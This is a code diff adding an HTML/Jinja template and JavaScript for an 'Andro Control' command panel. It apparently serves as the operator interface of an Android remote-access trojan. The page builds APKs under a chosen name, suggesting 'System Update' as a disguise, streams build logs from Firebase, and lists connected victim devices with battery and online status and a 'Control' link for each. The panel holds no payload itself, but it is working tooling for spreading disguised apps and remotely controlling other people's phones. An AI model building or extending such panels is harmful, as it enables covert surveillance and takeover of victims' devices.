@@ -1,0 +1,105 @@
+{% extends "base.html" %}
+{% block title %}Andro Control — Builder{% endblock %}
+{% block content %}
+<div class="fade-in">
+    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:32px;flex-wrap:wrap;gap:16px;">
+        <div>
+            <h1 style="font-size:1.8rem;margin-bottom:6px;">Command Center</h1>
+            <p style="color:var(--text-secondary);font-size:0.85rem;">Build APKs and monitor connected devices.</p>
+        </div>
+        <div class="glass-sm" style="padding:10px 18px;display:flex;align-items:center;gap:10px;">
+            <span style="font-size:0.72rem;color:var(--text-muted);">YOUR UID</span>
+            <code style="color:var(--accent);font-size:0.8rem;font-weight:600;">{{ uid }}</code>
+        </div>
+    </div>
+
+    <div style="display:grid;grid-template-columns:380px 1fr;gap:24px;align-items:start;">
+        <!-- Builder -->
+        <div class="card border-top-primary">
+            <div class="card-header-gradient">
+                <h4 style="font-size:1rem;display:flex;align-items:center;gap:10px;">
+                    <i class="fas fa-hammer text-primary-c"></i> APK Builder
+                </h4>
+            </div>
+            <div style="padding:24px;">
+                <form id="buildForm">
+                    <div style="margin-bottom:14px;"><label class="form-label">App Name</label>
+                    <input type="text" name="app_name" class="form-input" placeholder="e.g. System Update" required></div>
+                    <div style="margin-bottom:14px;"><label class="form-label">Webview URL</label>
+                    <input type="url" name="webview_url" class="form-input" placeholder="https://..." required></div>
+                    <div style="height:1px;background:var(--border);margin:18px 0;"></div>
+                    <div style="margin-bottom:20px;"><label class="form-label">Custom Icon (PNG)</label>
+                    <input type="file" name="app_icon" class="form-input" accept=".png" style="padding:8px 12px;"></div>
+                    <button type="submit" id="buildBtn" class="btn-primary-glow" style="width:100%;display:flex;align-items:center;justify-content:center;gap:8px;">
+                        <i class="fas fa-rocket" id="buildIcon"></i><span id="buildText">BUILD APK</span>
+                    </button>
+                </form>
+                <div id="progressArea" style="margin-top:20px;display:none;">
+                    <div class="progress-track" style="margin-bottom:10px;"><div id="progressBar" class="progress-fill" style="width:0%;"></div></div>
+                    <div id="consoleLog" class="console-box"><div id="logLines"></div></div>
+                    <p id="buildStatus" style="font-size:0.72rem;color:var(--text-secondary);text-align:center;margin-top:8px;">Initializing...</p>
+                </div>
+                <div id="downloadArea" style="margin-top:20px;padding:20px;background:rgba(0,184,148,0.08);border:1px dashed rgba(0,184,148,0.3);border-radius:var(--radius-sm);text-align:center;display:{{ 'block' if last_apk else 'none' }};">
+                    <p style="font-size:0.78rem;color:var(--success);font-weight:600;margin-bottom:10px;">✅ BUILD COMPLETE</p>
+                    <a href="/download/{{ last_apk }}" id="downloadBtn" class="btn-accent" style="text-decoration:none;"><i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Devices -->
+        <div class="card border-top-accent">
+            <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
+                <h4 style="font-size:1rem;display:flex;align-items:center;gap:10px;">
+                    <i class="fas fa-mobile-alt text-accent"></i> Connected Devices <span id="deviceCount" class="badge-count">0</span>
+                </h4>
+                <button class="btn-ghost" onclick="loadDevices()" style="padding:6px 14px;"><i class="fas fa-sync-alt"></i></button>
+            </div>
+            <div style="padding:0;">
+                <table class="data-table"><thead><tr><th>Device</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th></tr></thead>
+                <tbody id="deviceList"><tr><td colspan="4"><div class="empty-state"><i class="fas fa-satellite-dish"></i><p>Scanning for devices...</p></div></td></tr></tbody></table>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+const userId = "{{ uid }}";
+document.getElementById('buildForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const btn=document.getElementById('buildBtn'), text=document.getElementById('buildText'), icon=document.getElementById('buildIcon');
+    btn.disabled=true; text.textContent='STARTING...'; icon.className='fas fa-spinner fa-spin';
+    fetch('/build',{method:'POST',body:new FormData(this)}).then(r=>r.json()).then(data=>{
+        if(data.success){
+            document.getElementById('progressArea').style.display='block';
+            fbDb.ref('panel_users/'+userId+'/build_status').on('value',snap=>{
+                const v=snap.val(); if(!v)return;
+                document.getElementById('progressBar').style.width=v.percent+'%';
+                document.getElementById('buildStatus').textContent=v.status;
+                if(v.last_log&&v.last_log!==window._ll){window._ll=v.last_log;const l=document.createElement('div');l.className='console-line';l.textContent='> '+v.last_log;document.getElementById('logLines').appendChild(l);document.getElementById('consoleLog').scrollTop=999999;}
+                if(v.status==='✅ Complete'){text.textContent='SUCCESS!';icon.className='fas fa-check-circle';fbDb.ref('panel_users/'+userId).once('value',u=>{const ud=u.val();if(ud&&ud.last_apk){document.getElementById('downloadBtn').href='/download/'+ud.last_apk;document.getElementById('downloadArea').style.display='block';}});setTimeout(()=>{btn.disabled=false;text.textContent='BUILD APK';icon.className='fas fa-rocket';document.getElementById('progressArea').style.display='none';},5000);}
+                else if(v.status&&(v.status.includes('❌')||v.status.includes('⚠️'))){text.textContent='FAILED';icon.className='fas fa-exclamation-triangle';setTimeout(()=>{btn.disabled=false;text.textContent='BUILD APK';icon.className='fas fa-rocket';},3000);}
+            });
+        }else{btn.disabled=false;text.textContent='BUILD APK';icon.className='fas fa-rocket';}
+    }).catch(()=>{btn.disabled=false;text.textContent='BUILD APK';icon.className='fas fa-rocket';});
+});
+
+async function loadDevices(){
+    try{
+        const res=await fetch('/api/devices'),data=await res.json(),body=document.getElementById('deviceList'),devices=data.devices||[];
+        document.getElementById('deviceCount').textContent=devices.length;
+        if(!devices.length){body.innerHTML='<tr><td colspan="4"><div class="empty-state"><i class="fas fa-satellite-dish"></i><p>No devices connected. Install the APK to begin.</p></div></td></tr>';return;}
+        let h='';
+        devices.forEach(d=>{
+            const st=d.is_online?'status-online':'status-offline',sl=d.is_online?'Online':'Offline';
+            const bi=d.battery<20?'fa-battery-empty text-danger-c':d.battery<50?'fa-battery-quarter text-warning-c':'fa-battery-full text-success-c';
+            h+=`<tr><td><div style="font-weight:600;font-size:0.85rem;">${d.model}</div><div style="font-size:0.68rem;color:var(--text-muted);">${d.did}</div></td><td><i class="fas ${bi}" style="margin-right:4px;"></i>${d.battery}%</td><td><span class="${st}">${sl}</span></td><td style="text-align:right;"><a href="/control/${userId}/${d.did}" class="btn-accent" style="text-decoration:none;padding:7px 18px;font-size:0.75rem;"><i class="fas fa-terminal" style="margin-right:4px;"></i>Control</a></td></tr>`;
+        });
+        body.innerHTML=h;
+    }catch(e){console.error(e);}
+}
+loadDevices();
+setInterval(loadDevices,5000);
+</script>
+{% endblock %}
